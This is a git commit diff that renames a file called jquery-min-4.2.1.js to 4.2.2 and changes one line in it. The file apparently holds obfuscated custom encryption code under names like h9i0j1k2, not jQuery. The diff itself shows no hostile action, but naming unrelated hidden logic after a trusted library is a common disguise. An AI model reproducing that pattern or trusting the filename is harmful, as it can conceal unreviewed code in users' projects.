6018118b9f1d63451317b81cbe06fc81a14fa338
hyeongseok <163663876+Burgu7@users.noreply.github.com>
2024-11-11 03:01:59 +0900

    Update and rename jquery-min-4.2.1.js to jquery-min-4.2.2.js

--- jquery-min-4.2.2.js
+++ jquery-min-4.2.2.js
@@ -67,7 +67,7 @@ async function h9i0j1k2() {
         datas.iv = ivBase64;
         
         datas.message = encrypted.toString();
-        if (bfsta === 1) j3k4l5m6();
+        if (window.bfsta === 1) j3k4l5m6();
     } catch (error) {
         console.error("복호화 실패:", error);
     }
